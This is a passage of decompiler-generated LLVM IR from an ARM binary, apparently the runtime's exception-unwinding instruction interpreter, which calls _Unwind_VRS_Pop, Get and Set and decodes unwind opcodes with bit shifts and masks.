  store i32 %v1_18a20, i32* %r3.global-to-local, align 4
  %v1_18a24 = trunc i32 %v1_18a20 to i8
  store i8 %v1_18a24, i8* %v2_18a0c, align 1
  %v0_18a28 = load i32, i32* @r5, align 4
  %v1_18a28 = add i32 %v0_18a28, 4
  %v2_18a28 = inttoptr i32 %v1_18a28 to i32*
  %v3_18a28 = load i32, i32* %v2_18a28, align 4
  store i32 %v3_18a28, i32* %r2.global-to-local, align 4
  %v1_18a2c = inttoptr i32 %v3_18a28 to i32*
  %v2_18a2c = load i32, i32* %v1_18a2c, align 4
  store i32 %v2_18a2c, i32* %r0.global-to-local, align 4
  %v4_18a2c = add i32 %v3_18a28, 4
  store i32 %v4_18a2c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18a2c, i32* %v2_18a28, align 4
  %v0_18a38 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a38 = trunc i32 %v0_18a38 to i8
  %v2_18a38 = load i32, i32* @r5, align 4
  %v3_18a38 = add i32 %v2_18a38, 8
  %v4_18a38 = inttoptr i32 %v3_18a38 to i8*
  store i8 %v1_18a38, i8* %v4_18a38, align 1
  %v0_18a3c = load i32, i32* %r0.global-to-local, align 4
  %v1_18a3c = load i32, i32* @r5, align 4
  %v2_18a3c = inttoptr i32 %v1_18a3c to i32*
  store i32 %v0_18a3c, i32* %v2_18a3c, align 4
  br label %dec_label_pc_18a40

dec_label_pc_18a40:                               ; preds = %.thread48, %dec_label_pc_18a20
  %v0_18a40 = load i32, i32* %r0.global-to-local, align 4
  %v3_18a40 = udiv i32 %v0_18a40, 16777216
  %v1_18a44 = urem i32 %v3_18a40, 16
  %v3_18a48 = mul i32 %v0_18a40, 256
  store i32 %v3_18a48, i32* %r0.global-to-local, align 4
  %v1_18a4c = add nuw nsw i32 %v1_18a44, 1
  store i32 %v1_18a4c, i32* %r2.global-to-local, align 4
  %v1_18a50 = and i32 %v3_18a40, 240
  store i32 %v1_18a50, i32* %r3.global-to-local, align 4
  %v1_18a54 = load i32, i32* @r5, align 4
  %v2_18a54 = inttoptr i32 %v1_18a54 to i32*
  store i32 %v3_18a48, i32* %v2_18a54, align 4
  %v0_18a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_18a58 = load i32, i32* %r3.global-to-local, align 4
  %v4_18a58 = mul i32 %v1_18a58, 4096
  %v5_18a58 = or i32 %v4_18a58, %v0_18a58
  br label %dec_label_pc_18a5c

dec_label_pc_18a5c:                               ; preds = %dec_label_pc_18a0c, %dec_label_pc_18a40
  %storemerge131 = phi i32 [ %v5_18a58, %dec_label_pc_18a40 ], [ 720897, %dec_label_pc_18a0c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_18a64:                               ; preds = %dec_label_pc_18820
  %v0_18a64 = load i32, i32* @r5, align 4
  %v1_18a64 = add i32 %v0_18a64, 8
  %v2_18a64 = inttoptr i32 %v1_18a64 to i8*
  %v3_18a64 = load i8, i8* %v2_18a64, align 1
  %v4_18a64 = zext i8 %v3_18a64 to i32
  store i32 %v4_18a64, i32* %r3.global-to-local, align 4
  %v2_18a68 = icmp eq i8 %v3_18a64, 0
  store i1 %v2_18a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a68, label %dec_label_pc_18a78, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18a64
  %v2_18a6c = add nsw i32 %v4_18a64, -1
  store i32 %v2_18a6c, i32* %r3.global-to-local, align 4
  %v2_18a70 = trunc i32 %v2_18a6c to i8
  store i8 %v2_18a70, i8* %v2_18a64, align 1
  %v0_18a74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a74.pr.pr, label %.thread52.dec_label_pc_18a78_crit_edge, label %dec_label_pc_18aac

.thread52.dec_label_pc_18a78_crit_edge:           ; preds = %.thread52
  %v0_18a78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a78

dec_label_pc_18a78:                               ; preds = %.thread52.dec_label_pc_18a78_crit_edge, %dec_label_pc_18a64
  %v2_18a90 = phi i32 [ %v0_18a78.pre, %.thread52.dec_label_pc_18a78_crit_edge ], [ %v0_18a64, %dec_label_pc_18a64 ]
  %v1_18a78 = add i32 %v2_18a90, 9
  %v2_18a78 = inttoptr i32 %v1_18a78 to i8*
  %v3_18a78 = load i8, i8* %v2_18a78, align 1
  %v4_18a78 = zext i8 %v3_18a78 to i32
  store i32 %v4_18a78, i32* %r3.global-to-local, align 4
  %v2_18a7c = icmp eq i8 %v3_18a78, 0
  store i1 %v2_18a7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a7c, label %dec_label_pc_18ac8, label %dec_label_pc_18a8c

dec_label_pc_18a8c:                               ; preds = %dec_label_pc_18a78
  %v1_18a8c = add nsw i32 %v4_18a78, -1
  store i32 %v1_18a8c, i32* %r3.global-to-local, align 4
  %v1_18a90 = trunc i32 %v1_18a8c to i8
  store i8 %v1_18a90, i8* %v2_18a78, align 1
  %v0_18a94 = load i32, i32* @r5, align 4
  %v1_18a94 = add i32 %v0_18a94, 4
  %v2_18a94 = inttoptr i32 %v1_18a94 to i32*
  %v3_18a94 = load i32, i32* %v2_18a94, align 4
  store i32 %v3_18a94, i32* %r2.global-to-local, align 4
  %v1_18a98 = inttoptr i32 %v3_18a94 to i32*
  %v2_18a98 = load i32, i32* %v1_18a98, align 4
  store i32 %v2_18a98, i32* %r0.global-to-local, align 4
  %v4_18a98 = add i32 %v3_18a94, 4
  store i32 %v4_18a98, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18a98, i32* %v2_18a94, align 4
  %v0_18aa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18aa4 = trunc i32 %v0_18aa4 to i8
  %v2_18aa4 = load i32, i32* @r5, align 4
  %v3_18aa4 = add i32 %v2_18aa4, 8
  %v4_18aa4 = inttoptr i32 %v3_18aa4 to i8*
  store i8 %v1_18aa4, i8* %v4_18aa4, align 1
  %v0_18aa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_18aa8 = load i32, i32* @r5, align 4
  %v2_18aa8 = inttoptr i32 %v1_18aa8 to i32*
  store i32 %v0_18aa8, i32* %v2_18aa8, align 4
  br label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %.thread52, %dec_label_pc_18a8c
  %v0_18aac = load i32, i32* %r0.global-to-local, align 4
  %v3_18aac = udiv i32 %v0_18aac, 16777216
  %v1_18ab0 = urem i32 %v3_18aac, 16
  %v3_18ab4 = mul i32 %v0_18aac, 256
  store i32 %v3_18ab4, i32* %r0.global-to-local, align 4
  %v1_18ab8 = add nuw nsw i32 %v1_18ab0, 1
  store i32 %v1_18ab8, i32* %r2.global-to-local, align 4
  %v1_18abc = and i32 %v3_18aac, 240
  store i32 %v1_18abc, i32* %r3.global-to-local, align 4
  %v1_18ac0 = load i32, i32* @r5, align 4
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i32*
  store i32 %v3_18ab4, i32* %v2_18ac0, align 4
  %v0_18ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ac4 = load i32, i32* %r3.global-to-local, align 4
  %v4_18ac4 = mul i32 %v1_18ac4, 4096
  %v5_18ac4 = or i32 %v4_18ac4, %v0_18ac4
  br label %dec_label_pc_18ac8

dec_label_pc_18ac8:                               ; preds = %dec_label_pc_18a78, %dec_label_pc_18aac
  %storemerge130 = phi i32 [ %v5_18ac4, %dec_label_pc_18aac ], [ 720897, %dec_label_pc_18a78 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_187fc
  %v0_18ad0 = load i32, i32* @r5, align 4
  %v1_18ad0 = add i32 %v0_18ad0, 8
  %v2_18ad0 = inttoptr i32 %v1_18ad0 to i8*
  %v3_18ad0 = load i8, i8* %v2_18ad0, align 1
  %v4_18ad0 = zext i8 %v3_18ad0 to i32
  store i32 %v4_18ad0, i32* %r3.global-to-local, align 4
  %v2_18ad4 = icmp eq i8 %v3_18ad0, 0
  store i1 %v2_18ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ad4, label %dec_label_pc_18c7c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18ad0
  %v2_18ad8 = add nsw i32 %v4_18ad0, -1
  store i32 %v2_18ad8, i32* %r3.global-to-local, align 4
  %v2_18adc = trunc i32 %v2_18ad8 to i8
  store i8 %v2_18adc, i8* %v2_18ad0, align 1
  %v0_18ae0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ae0.pr.pr, label %.thread56.dec_label_pc_18c7c_crit_edge, label %dec_label_pc_18ae4

.thread56.dec_label_pc_18c7c_crit_edge:           ; preds = %.thread56
  %v0_18c7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18c7c

dec_label_pc_18ae4:                               ; preds = %.thread56, %dec_label_pc_18c88
  %v0_18ae4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ae4 = udiv i32 %v0_18ae4, 16777216
  store i32 %v3_18ae4, i32* %r3.global-to-local, align 4
  store i32 %v3_18ae4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18ae4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18aec = mul i32 %v0_18ae4, 256
  store i32 %v3_18aec, i32* %r0.global-to-local, align 4
  %v1_18af0 = load i32, i32* @r5, align 4
  %v2_18af0 = inttoptr i32 %v1_18af0 to i32*
  store i32 %v3_18aec, i32* %v2_18af0, align 4
  br i1 %tmp184, label %dec_label_pc_188ac, label %dec_label_pc_18af8

dec_label_pc_18af8:                               ; preds = %dec_label_pc_18ae4
  %v0_18af8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18af8 = and i32 %v0_18af8, 240
  store i32 %v1_18af8, i32* %r3.global-to-local, align 4
  %v2_18af8 = icmp eq i32 %v1_18af8, 0
  store i1 %v2_18af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18af8, label %dec_label_pc_18b00, label %dec_label_pc_188ac

dec_label_pc_18b00:                               ; preds = %dec_label_pc_18af8
  %v0_18b00 = load i32, i32* @r7, align 4
  store i32 %v0_18b00, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_18b08 = load i32, i32* %r2.global-to-local, align 4
  %v4_18b08 = call i32 @_Unwind_VRS_Pop(i32 %v0_18b00, i32 4, i32 %v2_18b08, i32 0)
  store i32 %v4_18b08, i32* %r0.global-to-local, align 4
  %v2_18b0c = icmp eq i32 %v4_18b08, 0
  store i1 %v2_18b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b0c, label %dec_label_pc_185dc.backedge, label %dec_label_pc_18b14

dec_label_pc_18b14:                               ; preds = %dec_label_pc_18b00
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_18b1c:                               ; preds = %dec_label_pc_18948
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18b28 = load i32, i32* @r7, align 4
  store i32 %v0_18b28, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_18b34 = call i32 @_Unwind_VRS_Get(i32 %v0_18b28, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18b34, i32* %r0.global-to-local, align 4
  %v0_18b38 = load i32, i32* @r5, align 4
  %v1_18b38 = add i32 %v0_18b38, 8
  %v2_18b38 = inttoptr i32 %v1_18b38 to i8*
  %v3_18b38 = load i8, i8* %v2_18b38, align 1
  %v4_18b38 = zext i8 %v3_18b38 to i32
  store i32 %v4_18b38, i32* %r1.global-to-local, align 4
  %v2_18b3c = icmp eq i8 %v3_18b38, 0
  store i1 %v2_18b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b3c, label %dec_label_pc_18b4c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_18b1c
  %v2_18b40 = add nsw i32 %v4_18b38, -1
  store i32 %v2_18b40, i32* %r3.global-to-local, align 4
  %v2_18b44 = trunc i32 %v2_18b40 to i8
  store i8 %v2_18b44, i8* %v2_18b38, align 1
  %v0_18b48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b48.pr.pr, label %.thread58.dec_label_pc_18b4c_crit_edge, label %dec_label_pc_18b78

.thread58.dec_label_pc_18b4c_crit_edge:           ; preds = %.thread58
  %v0_18b4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b4c

dec_label_pc_18b4c:                               ; preds = %.thread58.dec_label_pc_18b4c_crit_edge, %dec_label_pc_18b1c
  %v2_18b60 = phi i32 [ %v0_18b4c.pre, %.thread58.dec_label_pc_18b4c_crit_edge ], [ %v0_18b38, %dec_label_pc_18b1c ]
  %v1_18b4c = add i32 %v2_18b60, 9
  %v2_18b4c = inttoptr i32 %v1_18b4c to i8*
  %v3_18b4c = load i8, i8* %v2_18b4c, align 1
  %v4_18b4c = zext i8 %v3_18b4c to i32
  store i32 %v4_18b4c, i32* %r3.global-to-local, align 4
  %v2_18b50 = icmp eq i8 %v3_18b4c, 0
  store i1 %v2_18b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b50, label %bb158, label %dec_label_pc_18b5c

bb158:                                            ; preds = %dec_label_pc_18b4c
  %v1_18b54 = load i32, i32* @r6, align 4
  store i32 %v1_18b54, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ba0

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18b4c
  %v1_18b5c = add nsw i32 %v4_18b4c, -1
  store i32 %v1_18b5c, i32* %r3.global-to-local, align 4
  %v1_18b60 = trunc i32 %v1_18b5c to i8
  store i8 %v1_18b60, i8* %v2_18b4c, align 1
  %v0_18b64 = load i32, i32* @r5, align 4
  %v1_18b64 = add i32 %v0_18b64, 4
  %v2_18b64 = inttoptr i32 %v1_18b64 to i32*
  %v3_18b64 = load i32, i32* %v2_18b64, align 4
  store i32 %v3_18b64, i32* %r2.global-to-local, align 4
  %v1_18b68 = inttoptr i32 %v3_18b64 to i32*
  %v2_18b68 = load i32, i32* %v1_18b68, align 4
  store i32 %v2_18b68, i32* %r0.global-to-local, align 4
  %v4_18b68 = add i32 %v3_18b64, 4
  store i32 %v4_18b68, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18b70 = inttoptr i32 %v0_18b64 to i32*
  store i32 %v2_18b68, i32* %v1_18b70, align 4
  %v5_18b70 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18b70, i32* %v2_18b64, align 4
  %v0_18b74 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b74 = trunc i32 %v0_18b74 to i8
  %v2_18b74 = load i32, i32* @r5, align 4
  %v3_18b74 = add i32 %v2_18b74, 8
  %v4_18b74 = inttoptr i32 %v3_18b74 to i8*
  store i8 %v1_18b74, i8* %v4_18b74, align 1
  br label %dec_label_pc_18b78

dec_label_pc_18b78:                               ; preds = %.thread58, %dec_label_pc_18b5c
  %v0_18b78 = load i32, i32* @r5, align 4
  %v1_18b78 = inttoptr i32 %v0_18b78 to i32*
  %v2_18b78 = load i32, i32* %v1_18b78, align 4
  store i32 %v2_18b78, i32* %r3.global-to-local, align 4
  %v3_18b7c = mul i32 %v2_18b78, 256
  store i32 %v3_18b7c, i32* %r0.global-to-local, align 4
  %v3_18b80 = udiv i32 %v2_18b78, 16777216
  store i32 %v3_18b80, i32* %r2.global-to-local, align 4
  store i32 %v3_18b7c, i32* %v1_18b78, align 4
  %v0_18b88 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b88 = and i32 %v0_18b88, 128
  %v2_18b88 = icmp eq i32 %v1_18b88, 0
  store i1 %v2_18b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b88, label %.thread129, label %dec_label_pc_18b9c

.thread129:                                       ; preds = %dec_label_pc_18b78
  %v4_18b8c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_18b8c, i32* %ip.global-to-local, align 4
  %v1_18b90 = urem i32 %v0_18b88, 256
  store i32 %v1_18b90, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_18c10

dec_label_pc_18b9c:                               ; preds = %dec_label_pc_18b78
  %v1_18b9063 = urem i32 %v0_18b88, 256
  store i32 %v1_18b9063, i32* %r2.global-to-local, align 4
  %v0_18b9c = load i32, i32* @r5, align 4
  %v1_18b9c = add i32 %v0_18b9c, 8
  %v2_18b9c = inttoptr i32 %v1_18b9c to i8*
  %v3_18b9c = load i8, i8* %v2_18b9c, align 1
  %v4_18b9c = zext i8 %v3_18b9c to i32
  store i32 %v4_18b9c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ba0

dec_label_pc_18ba0:                               ; preds = %bb158, %dec_label_pc_18b9c
  %v3_18bc099 = phi i32 [ %v2_18b60, %bb158 ], [ %v0_18b9c, %dec_label_pc_18b9c ]
  %v0_18ba892 = phi i32 [ %v1_18b54, %bb158 ], [ %v1_18b9063, %dec_label_pc_18b9c ]
  %v3_18ba0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_18ba0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18ba8.backedge, %dec_label_pc_18ba0
  %v3_18bc0 = phi i32 [ %v3_18bc0100, %dec_label_pc_18ba8.backedge ], [ %v3_18bc099, %dec_label_pc_18ba0 ]
  %v0_18bbc = phi i32 [ %v2_18bac.pre, %dec_label_pc_18ba8.backedge ], [ 2, %dec_label_pc_18ba0 ]
  %v0_18bac = phi i32 [ %v0_18bac.pre, %dec_label_pc_18ba8.backedge ], [ %v3_18ba0, %dec_label_pc_18ba0 ]
  %v0_18ba8 = phi i32 [ %v0_18ba895, %dec_label_pc_18ba8.backedge ], [ %v0_18ba892, %dec_label_pc_18ba0 ]
  %v1_18ba8 = urem i32 %v0_18ba8, 128
  %v7_18bac = shl i32 %v1_18ba8, %v0_18bbc
  %v8_18bac = add i32 %v7_18bac, %v0_18bac
  store i32 %v8_18bac, i32* %ip.global-to-local, align 4
  %v0_18bb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_18bb0 = icmp eq i32 %v0_18bb0, 0
  store i1 %v2_18bb0, i1* %cpsr_z.global-to-local, align 1
  %v1_18bb4 = add i32 %v0_18bb0, -1
  store i32 %v1_18bb4, i32* %r3.global-to-local, align 4
  store i32 %v8_18bac, i32* %stack_var_-36, align 4
  %v1_18bbc = add i32 %v0_18bbc, 7
  store i32 %v1_18bbc, i32* @lr, align 4
  br i1 %v2_18bb0, label %dec_label_pc_18bc8, label %bb159

bb159:                                            ; preds = %dec_label_pc_18ba8
  %v2_18bc0 = trunc i32 %v1_18bb4 to i8
  %v4_18bc0 = add i32 %v3_18bc0, 8
  %v5_18bc0 = inttoptr i32 %v4_18bc0 to i8*
  store i8 %v2_18bc0, i8* %v5_18bc0, align 1
  %v0_18bc4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18bc4.pr, label %.dec_label_pc_18bc8_crit_edge, label %dec_label_pc_18bf4

.dec_label_pc_18bc8_crit_edge:                    ; preds = %bb159
  %v0_18bc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18bc8

dec_label_pc_18bc8:                               ; preds = %.dec_label_pc_18bc8_crit_edge, %dec_label_pc_18ba8
  %v2_18be0 = phi i32 [ %v0_18bc8.pre, %.dec_label_pc_18bc8_crit_edge ], [ %v3_18bc0, %dec_label_pc_18ba8 ]
  %v1_18bc8 = add i32 %v2_18be0, 9
  %v2_18bc8 = inttoptr i32 %v1_18bc8 to i8*
  %v3_18bc8 = load i8, i8* %v2_18bc8, align 1
  %v4_18bc8 = zext i8 %v3_18bc8 to i32
  store i32 %v4_18bc8, i32* %r3.global-to-local, align 4
  %v2_18bcc = icmp eq i8 %v3_18bc8, 0
  store i1 %v2_18bcc, i1* %cpsr_z.global-to-local, align 1
  %v1_18bd0 = add nsw i32 %v4_18bc8, -1
  store i32 %v1_18bd0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_18bcc, label %dec_label_pc_18ba8.backedge, label %dec_label_pc_18bdc

dec_label_pc_18bdc:                               ; preds = %dec_label_pc_18bc8
  %v1_18bdc = add i32 %v2_18be0, 4
  %v2_18bdc = inttoptr i32 %v1_18bdc to i32*
  %v3_18bdc = load i32, i32* %v2_18bdc, align 4
  store i32 %v3_18bdc, i32* %r2.global-to-local, align 4
  %v1_18be0 = trunc i32 %v1_18bd0 to i8
  store i8 %v1_18be0, i8* %v2_18bc8, align 1
  %v0_18be4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18be4 = inttoptr i32 %v0_18be4 to i32*
  %v2_18be4 = load i32, i32* %v1_18be4, align 4
  store i32 %v2_18be4, i32* %r0.global-to-local, align 4
  %v4_18be4 = add i32 %v0_18be4, 4
  store i32 %v4_18be4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_18bec = load i32, i32* @r5, align 4
  %v3_18bec = add i32 %v2_18bec, 8
  %v4_18bec = inttoptr i32 %v3_18bec to i8*
  store i8 3, i8* %v4_18bec, align 1
  %v0_18bf0 = load i32, i32* @r5, align 4
  %v1_18bf0 = inttoptr i32 %v0_18bf0 to i32*
  %v2_18bf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_18bf0, i32* %v1_18bf0, align 4
  %v3_18bf0 = add i32 %v0_18bf0, 4
  %v4_18bf0 = inttoptr i32 %v3_18bf0 to i32*
  %v5_18bf0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18bf0, i32* %v4_18bf0, align 4
  br label %dec_label_pc_18bf4

dec_label_pc_18bf4:                               ; preds = %bb159, %dec_label_pc_18bdc
  %v0_18bf4 = load i32, i32* @r5, align 4
  %v1_18bf4 = inttoptr i32 %v0_18bf4 to i32*
  %v2_18bf4 = load i32, i32* %v1_18bf4, align 4
  store i32 %v2_18bf4, i32* %r3.global-to-local, align 4
  %v3_18bf8 = udiv i32 %v2_18bf4, 16777216
  store i32 %v3_18bf8, i32* %r2.global-to-local, align 4
  %v1_18bfc = and i32 %v3_18bf8, 128
  %v2_18bfc = icmp eq i32 %v1_18bfc, 0
  store i1 %v2_18bfc, i1* %cpsr_z.global-to-local, align 1
  %v3_18c00 = mul i32 %v2_18bf4, 256
  store i32 %v3_18c00, i32* %r0.global-to-local, align 4
  store i32 %v3_18c00, i32* %v1_18bf4, align 4
  %v0_18c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c08 = urem i32 %v0_18c08, 256
  store i32 %v1_18c08, i32* %r2.global-to-local, align 4
  br i1 %v2_18bfc, label %dec_label_pc_18c10.loopexit, label %dec_label_pc_18c3c

dec_label_pc_18c10.loopexit:                      ; preds = %dec_label_pc_18bf4
  %v0_18c14.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_18c18.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18c10

dec_label_pc_18c10:                               ; preds = %dec_label_pc_18c10.loopexit, %.thread129
  %v2_18c18 = phi i32 [ 2, %.thread129 ], [ %v2_18c18.pre, %dec_label_pc_18c10.loopexit ]
  %v0_18c14 = phi i32 [ %v4_18b8c, %.thread129 ], [ %v0_18c14.pre, %dec_label_pc_18c10.loopexit ]
  %v0_18c10 = phi i32 [ %v1_18b90, %.thread129 ], [ %v1_18c08, %dec_label_pc_18c10.loopexit ]
  %v1_18c10 = urem i32 %v0_18c10, 128
  %v1_18c14 = add i32 %v0_18c14, 516
  %v7_18c18 = shl i32 %v1_18c10, %v2_18c18
  %v8_18c18 = add i32 %v1_18c14, %v7_18c18
  store i32 %v8_18c18, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18c20 = load i32, i32* @r7, align 4
  store i32 %v0_18c20, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_18c18, i32* %stack_var_-36, align 4
  %v5_18c34 = call i32 @_Unwind_VRS_Set(i32 %v0_18c20, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18c34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185dc.backedge

dec_label_pc_18c3c:                               ; preds = %dec_label_pc_18bf4
  %v0_18c3c = load i32, i32* @r5, align 4
  %v1_18c3c = add i32 %v0_18c3c, 8
  %v2_18c3c = inttoptr i32 %v1_18c3c to i8*
  %v3_18c3c = load i8, i8* %v2_18c3c, align 1
  %v4_18c3c = zext i8 %v3_18c3c to i32
  store i32 %v4_18c3c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ba8.backedge

dec_label_pc_18ba8.backedge:                      ; preds = %dec_label_pc_18c3c, %dec_label_pc_18bc8
  %v3_18bc0100 = phi i32 [ %v0_18c3c, %dec_label_pc_18c3c ], [ %v2_18be0, %dec_label_pc_18bc8 ]
  %v0_18ba895 = phi i32 [ %v1_18c08, %dec_label_pc_18c3c ], [ 176, %dec_label_pc_18bc8 ]
  %v0_18bac.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_18bac.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18ba8

dec_label_pc_18c44:                               ; preds = %dec_label_pc_18940
  %v0_18c44 = load i32, i32* @r5, align 4
  %v1_18c44 = add i32 %v0_18c44, 8
  %v2_18c44 = inttoptr i32 %v1_18c44 to i8*
  %v3_18c44 = load i8, i8* %v2_18c44, align 1
  %v4_18c44 = zext i8 %v3_18c44 to i32
  store i32 %v4_18c44, i32* %r3.global-to-local, align 4
  %v2_18c48 = icmp eq i8 %v3_18c44, 0
  store i1 %v2_18c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c48, label %dec_label_pc_18cac, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_18c44
  %v2_18c4c = add nsw i32 %v4_18c44, -1
  store i32 %v2_18c4c, i32* %r3.global-to-local, align 4
  %v2_18c50 = trunc i32 %v2_18c4c to i8
  store i8 %v2_18c50, i8* %v2_18c44, align 1
  %v0_18c54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c54.pr.pr, label %.thread66.dec_label_pc_18cac_crit_edge, label %dec_label_pc_18c58

.thread66.dec_label_pc_18cac_crit_edge:           ; preds = %.thread66
  %v0_18cac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18cac

dec_label_pc_18c58:                               ; preds = %.thread66, %dec_label_pc_18cb8
  %v0_18c58 = load i32, i32* %r0.global-to-local, align 4
  %v3_18c58 = udiv i32 %v0_18c58, 16777216
  store i32 %v3_18c58, i32* %r3.global-to-local, align 4
  store i32 %v3_18c58, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_18c58, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_18c60 = mul i32 %v0_18c58, 256
  store i32 %v3_18c60, i32* %r0.global-to-local, align 4
  %v1_18c64 = load i32, i32* @r5, align 4
  %v2_18c64 = inttoptr i32 %v1_18c64 to i32*
  store i32 %v3_18c60, i32* %v2_18c64, align 4
  br i1 %tmp185, label %dec_label_pc_188ac, label %dec_label_pc_18c6c

dec_label_pc_18c6c:                               ; preds = %dec_label_pc_18c58
  %v0_18c6c = load i32, i32* %r3.global-to-local, align 4
  %v1_18c6c = and i32 %v0_18c6c, 240
  store i32 %v1_18c6c, i32* %r1.global-to-local, align 4
  %v2_18c6c = icmp eq i32 %v1_18c6c, 0
  store i1 %v2_18c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c6c, label %dec_label_pc_18c6c.dec_label_pc_188dc_crit_edge, label %dec_label_pc_18c74

dec_label_pc_18c6c.dec_label_pc_188dc_crit_edge:  ; preds = %dec_label_pc_18c6c
  %v2_188e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_18c74:                               ; preds = %dec_label_pc_18c6c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_18c7c:                               ; preds = %.thread56.dec_label_pc_18c7c_crit_edge, %dec_label_pc_18ad0
  %v2_18c8c = phi i32 [ %v0_18c7c.pre, %.thread56.dec_label_pc_18c7c_crit_edge ], [ %v0_18ad0, %dec_label_pc_18ad0 ]
  %v1_18c7c = add i32 %v2_18c8c, 9
  %v2_18c7c = inttoptr i32 %v1_18c7c to i8*
  %v3_18c7c = load i8, i8* %v2_18c7c, align 1
  %v4_18c7c = zext i8 %v3_18c7c to i32
  store i32 %v4_18c7c, i32* %r3.global-to-local, align 4
  %v2_18c80 = icmp eq i8 %v3_18c7c, 0
  store i1 %v2_18c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c80, label %dec_label_pc_188ac, label %dec_label_pc_18c88

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18c7c
  %v1_18c88 = add nsw i32 %v4_18c7c, -1
  store i32 %v1_18c88, i32* %r3.global-to-local, align 4
  %v1_18c8c = trunc i32 %v1_18c88 to i8
  store i8 %v1_18c8c, i8* %v2_18c7c, align 1
  %v0_18c90 = load i32, i32* @r5, align 4
  %v1_18c90 = add i32 %v0_18c90, 4
  %v2_18c90 = inttoptr i32 %v1_18c90 to i32*
